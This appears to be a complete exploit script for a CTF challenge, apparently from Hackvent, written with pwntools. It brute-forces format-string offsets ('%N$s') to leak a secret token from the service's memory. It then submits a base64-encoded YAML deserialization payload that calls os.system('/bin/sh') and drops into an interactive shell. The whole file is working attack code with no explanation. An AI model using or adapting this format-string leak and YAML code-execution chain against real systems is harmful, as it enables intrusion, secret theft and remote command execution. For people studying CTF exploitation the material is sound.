#!/usr/bin/env python

from pwn import *

YML_PAYLOAD = '''\
name: hax
exploit: !!python/object/apply:os.system
   args: [ /bin/sh ]
'''


def exploit_yml(token, payload):
    marshmallows.recvuntil('> ')
    marshmallows.sendline('send_secret_marshmallows')
    marshmallows.recvuntil('[?] Token: ')
    marshmallows.sendline(token)
    marshmallows.recvuntil('[?] Your secret marshmallows: ')
    marshmallows.sendline(b64e(payload.encode('ascii')).decode('ascii'))
    marshmallows.interactive()


for i in range(280, 300):
    marshmallows = remote('challenges.hackvent.hacking-lab.com', 1033)
    marshmallows.recvuntil('> ')
    marshmallows.sendline('1')
    marshmallows.recvuntil('marshmallows: ')
    marshmallows.sendline('%' + str(i) + '$s')

    try:
        mem_leak = marshmallows.recvline()
        print mem_leak
        if 'MARSHMALLOW_TOKEN' in mem_leak:
            token = mem_leak[mem_leak.index('MARSHMALLOW_TOKEN=')+len('MARSHMALLOW_TOKEN='):]
            token = token[:token.index('\n')]

            exploit_yml(token, YML_PAYLOAD)
            break
        else: print '[-] Marshmallow Token not found, retry exploit!'
    except: pass

    marshmallows.close()
